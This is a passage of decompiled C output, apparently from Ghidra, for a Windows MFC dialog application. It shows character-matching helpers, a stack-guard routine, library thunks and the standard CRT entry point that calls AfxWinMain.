      puVar4 = *(ushort **)(puVar4 + 1);
    } while (puVar4 != (ushort *)0x0);
    if (puVar4 == (ushort *)0x0) goto LAB_00414e69;
LAB_00414e90:
    uVar3 = 1;
  }
  return uVar3;
}



uint __thiscall FUN_00414e99(void *this,undefined4 param_1)

{
  bool bVar1;
  uint in_EAX;
  int iVar2;
  uint uVar3;
  ushort *puVar4;
  void **ppvVar5;
  
  if (*(char *)((int)this + 5) != '\0') {
    return in_EAX & 0xffffff00;
  }
  puVar4 = *(ushort **)((int)this + 0x34);
  if (puVar4 == (ushort *)0x0) {
LAB_00414ed3:
    ppvVar5 = *(void ***)((int)this + 0x3c);
    if (ppvVar5 != (void **)0x0) {
      do {
        bVar1 = FUN_00414cee(*ppvVar5,param_1);
        if (bVar1) break;
        ppvVar5 = (void **)ppvVar5[1];
      } while (ppvVar5 != (void **)0x0);
      if (ppvVar5 != (void **)0x0) goto LAB_00414efa;
    }
    uVar3 = 0;
  }
  else {
    do {
      iVar2 = _isctype((int)(char)param_1,(uint)*puVar4);
      if (iVar2 == 0) break;
      puVar4 = *(ushort **)(puVar4 + 1);
    } while (puVar4 != (ushort *)0x0);
    if (puVar4 == (ushort *)0x0) goto LAB_00414ed3;
LAB_00414efa:
    uVar3 = 1;
  }
  return uVar3;
}



uint __thiscall FUN_00414f03(void *this,undefined4 param_1)

{
  bool bVar1;
  uint in_EAX;
  int iVar2;
  uint uVar3;
  ushort *puVar4;
  void **ppvVar5;
  
  if (*(char *)((int)this + 5) != '\0') {
    return in_EAX & 0xffffff00;
  }
  puVar4 = *(ushort **)((int)this + 0x2e);
  if (puVar4 == (ushort *)0x0) {
LAB_00414f3d:
    ppvVar5 = *(void ***)((int)this + 0x33);
    if (ppvVar5 != (void **)0x0) {
      do {
        bVar1 = FUN_00414ca0(*ppvVar5,param_1);
        if (bVar1) break;
        ppvVar5 = (void **)ppvVar5[1];
      } while (ppvVar5 != (void **)0x0);
      if (ppvVar5 != (void **)0x0) goto LAB_00414f64;
    }
    uVar3 = 0;
  }
  else {
    do {
      iVar2 = _isctype((int)(char)param_1,(uint)*puVar4);
      if (iVar2 == 0) break;
      puVar4 = *(ushort **)(puVar4 + 1);
    } while (puVar4 != (ushort *)0x0);
    if (puVar4 == (ushort *)0x0) goto LAB_00414f3d;
LAB_00414f64:
    uVar3 = 1;
  }
  return uVar3;
}



uint __thiscall FUN_00414f6d(void *this,undefined4 param_1)

{
  bool bVar1;
  uint in_EAX;
  int iVar2;
  uint uVar3;
  ushort *puVar4;
  void **ppvVar5;
  
  if (*(char *)((int)this + 5) != '\0') {
    return in_EAX & 0xffffff00;
  }
  puVar4 = *(ushort **)((int)this + 0x2e);
  if (puVar4 == (ushort *)0x0) {
LAB_00414fa7:
    ppvVar5 = *(void ***)((int)this + 0x33);
    if (ppvVar5 != (void **)0x0) {
      do {
        bVar1 = FUN_00414cee(*ppvVar5,param_1);
        if (bVar1) break;
        ppvVar5 = (void **)ppvVar5[1];
      } while (ppvVar5 != (void **)0x0);
      if (ppvVar5 != (void **)0x0) goto LAB_00414fce;
    }
    uVar3 = 0;
  }
  else {
    do {
      iVar2 = _isctype((int)(char)param_1,(uint)*puVar4);
      if (iVar2 == 0) break;
      puVar4 = *(ushort **)(puVar4 + 1);
    } while (puVar4 != (ushort *)0x0);
    if (puVar4 == (ushort *)0x0) goto LAB_00414fa7;
LAB_00414fce:
    uVar3 = 1;
  }
  return uVar3;
}



BOOL FUN_00414fff(void)

{
  SIZE_T SVar1;
  DWORD DVar2;
  BOOL BVar3;
  LPVOID lpAddress;
  undefined1 unaff_DI;
  _SYSTEM_INFO local_4c;
  _MEMORY_BASIC_INFORMATION local_28;
  DWORD local_c;
  SIZE_T local_8;
  
  FUN_00415390(unaff_DI);
  SVar1 = VirtualQuery(&stack0xffffffa8,&local_28,0x1c);
  if (SVar1 != 0) {
    GetSystemInfo(&local_4c);
    local_8 = local_4c.dwPageSize;
    lpAddress = (LPVOID)((~(local_4c.dwPageSize - 1) & (uint)&stack0xffffffa8) - local_4c.dwPageSize
                        );
    DVar2 = FUN_004150b3();
    if ((LPVOID)((-(uint)(DVar2 != 1) & 0xffff1000) + 0x11000 + (int)local_28.AllocationBase) <=
        lpAddress) {
      DVar2 = FUN_004150b3();
      if (DVar2 != 1) {
        if (local_28.AllocationBase < lpAddress) {
          VirtualFree(local_28.AllocationBase,(int)lpAddress - (int)local_28.AllocationBase,0x4000);
        }
        VirtualAlloc(lpAddress,local_8,0x1000,4);
      }
      DVar2 = FUN_004150b3();
      BVar3 = VirtualProtect(lpAddress,local_8,(-(uint)(DVar2 != 1) & 0x103) + 1,&local_c);
      return BVar3;
    }
  }
  return 0;
}



DWORD FUN_004150b3(void)

{
  BOOL BVar1;
  _OSVERSIONINFOA local_98;
  
  if ((DAT_0041c9cd & 1) == 0) {
    DAT_0041c9cd = DAT_0041c9cd | 1;
    DAT_0041c9d0 = 0;
    local_98.dwOSVersionInfoSize = 0x94;
    BVar1 = GetVersionExA(&local_98);
    if (BVar1 != 0) {
      DAT_0041c9d0 = local_98.dwPlatformId;
    }
    FUN_0041536c((_onexit_t)&DAT_004043cc);
  }
  return DAT_0041c9d0;
}



void __thiscall CWinApp::CWinApp(CWinApp *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004151e4. Too many branches
                    // WARNING: Treating indirect jump as call
  CWinApp(this,param_1);
  return;
}



void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004151ea. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}



void __thiscall CWinApp::~CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x004151f0. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CWinApp(this);
  return;
}



void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004151f6. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



int __thiscall CDialog::DoModal(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004151fc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DoModal(this);
  return iVar1;
}



int __thiscall CWinApp::Enable3dControls(CWinApp *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415202. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Enable3dControls(this);
  return iVar1;
}



void __cdecl AfxEnableControlContainer(COccManager *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00415208. Too many branches
                    // WARNING: Treating indirect jump as call
  AfxEnableControlContainer(param_1);
  return;
}



void __thiscall CDialog::~CDialog(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x0041520e. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CDialog(this);
  return;
}



void __thiscall CString::~CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x00415214. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CString(this);
  return;
}



void __thiscall CDialog::OnOK(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x00415226. Too many branches
                    // WARNING: Treating indirect jump as call
  OnOK(this);
  return;
}



void __thiscall CDialog::CDialog(CDialog *this,uint param_1,CWnd *param_2)

{
                    // WARNING: Could not recover jumptable at 0x004152d4. Too many branches
                    // WARNING: Treating indirect jump as call
  CDialog(this,param_1,param_2);
  return;
}



HINSTANCE__ * AfxFindResourceHandle(char *param_1,char *param_2)

{
  HINSTANCE__ *pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x004152da. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = AfxFindResourceHandle(param_1,param_2);
  return pHVar1;
}



AFX_MODULE_STATE * AfxGetModuleState(void)

{
  AFX_MODULE_STATE *pAVar1;
  
                    // WARNING: Could not recover jumptable at 0x004152e0. Too many branches
                    // WARNING: Treating indirect jump as call
  pAVar1 = AfxGetModuleState();
  return pAVar1;
}



CString * __thiscall CString::operator=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004152e6. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator=(this,param_1);
  return pCVar1;
}



void __thiscall CString::CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x004152ec. Too many branches
                    // WARNING: Treating indirect jump as call
  CString(this);
  return;
}



void DDX_Check(CDataExchange *param_1,int param_2,int *param_3)

{
                    // WARNING: Could not recover jumptable at 0x004152f2. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Check(param_1,param_2,param_3);
  return;
}



void DDX_Text(CDataExchange *param_1,int param_2,CString *param_3)

{
                    // WARNING: Could not recover jumptable at 0x004152f8. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Text(param_1,param_2,param_3);
  return;
}



long __thiscall CWnd::Default(CWnd *this)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041530a. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = Default(this);
  return lVar1;
}



void __thiscall CPaintDC::~CPaintDC(CPaintDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00415310. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CPaintDC(this);
  return;
}



void __thiscall CPaintDC::CPaintDC(CPaintDC *this,CWnd *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00415316. Too many branches
                    // WARNING: Treating indirect jump as call
  CPaintDC(this,param_1);
  return;
}



void __thiscall CWnd::SetWindowTextA(CWnd *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0041531c. Too many branches
                    // WARNING: Treating indirect jump as call
  SetWindowTextA(this,param_1);
  return;
}



CWnd * __thiscall CWnd::GetDlgItem(CWnd *this,int param_1)

{
  CWnd *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415322. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetDlgItem(this,param_1);
  return pCVar1;
}



void __thiscall CString::Format(CString *this,char *param_1,...)

{
                    // WARNING: Could not recover jumptable at 0x00415328. Too many branches
                    // WARNING: Treating indirect jump as call
  Format(this,param_1);
  return;
}



CString * __thiscall CString::operator+=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041532e. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator+=(this,param_1);
  return pCVar1;
}



int __thiscall CWnd::UpdateData(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415334. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = UpdateData(this,param_1);
  return iVar1;
}



int __thiscall CWnd::EnableWindow(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041533a. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = EnableWindow(this,param_1);
  return iVar1;
}



void __cdecl FUN_00415340(_onexit_t param_1)

{
  if (DAT_0041cbe4 == -1) {
    _onexit(param_1);
    return;
  }
  __dllonexit(param_1,&DAT_0041cbe4,&DAT_0041cbe0);
  return;
}



int __cdecl FUN_0041536c(_onexit_t param_1)

{
  int iVar1;
  
  iVar1 = FUN_00415340(param_1);
  return (iVar1 != 0) - 1;
}



void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041537e. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415384. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_00415390(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004153c0. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcpy(_Dest,_Source);
  return pcVar1;
}



void __CxxFrameHandler(void)

{
                    // WARNING: Could not recover jumptable at 0x004153c6. Too many branches
                    // WARNING: Treating indirect jump as call
  __CxxFrameHandler();
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void _EH_prolog(void)

{
  undefined auStack_c [12];
  
  ExceptionList = auStack_c;
                    // WARNING: Could not recover jumptable at 0x004153d0. Too many branches
                    // WARNING: Treating indirect jump as call
  return;
}



size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004153d6. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen(_Str);
  return sVar1;
}



void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x004153fe. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  _CxxThrowException(pExceptionObject,pThrowInfo);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  uint uVar2;
  HMODULE pHVar3;
  byte *pbVar4;
  HINSTANCE__ *pHVar5;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00419100;
  puStack_10 = &DAT_00415404;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_0041cbe0 = 0xffffffff;
  DAT_0041cbe4 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0041c9c8;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0041c9c4;
  _DAT_0041cbdc = *(undefined4 *)_adjust_fdiv_exref;
  FUN_0041559b();
  if (DAT_0041c8d8 == 0) {
    __setusermatherr(&LAB_00415598);
  }
  FUN_00415586();
  _initterm(&DAT_0041c028,&DAT_0041c02c);
  local_70.newmode = DAT_0041c9c0;
  __getmainargs(&local_64,&local_74,&local_68,DAT_0041c9bc,&local_70);
  _initterm(&DAT_0041c000,&DAT_0041c024);
  pbVar4 = *(byte **)_acmdln_exref;
  if (*pbVar4 != 0x22) {
    do {
      if (*pbVar4 < 0x21) goto LAB_00415503;
      pbVar4 = pbVar4 + 1;
    } while( true );
  }
  do {
    pbVar4 = pbVar4 + 1;
    if (*pbVar4 == 0) break;
  } while (*pbVar4 != 0x22);
  if (*pbVar4 != 0x22) goto LAB_00415503;
  do {
    pbVar4 = pbVar4 + 1;
LAB_00415503:
  } while ((*pbVar4 != 0) && (*pbVar4 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    uVar2 = 10;
  }
  else {
    uVar2 = (uint)local_60.wShowWindow;
  }
  pHVar5 = (HINSTANCE__ *)0x0;
  pHVar3 = GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_004155c6(pHVar3,pHVar5,(char *)pbVar4,uVar2);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



void __dllonexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0041556e. Too many branches
                    // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00415580. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void FUN_00415586(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



void FUN_0041559b(void)

{
  return;
}



uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041559c. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}



void FUN_004155c6(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  AfxWinMain(param_1,param_2,param_3,param_4);
  return;
}



int AfxWinMain(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041561e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxWinMain(param_1,param_2,param_3,param_4);
  return iVar1;
}



void FUN_004515a9(void)

{
  return;
}



void FUN_00452b18(void)

{
  FUN_004515a9();
  return;
}


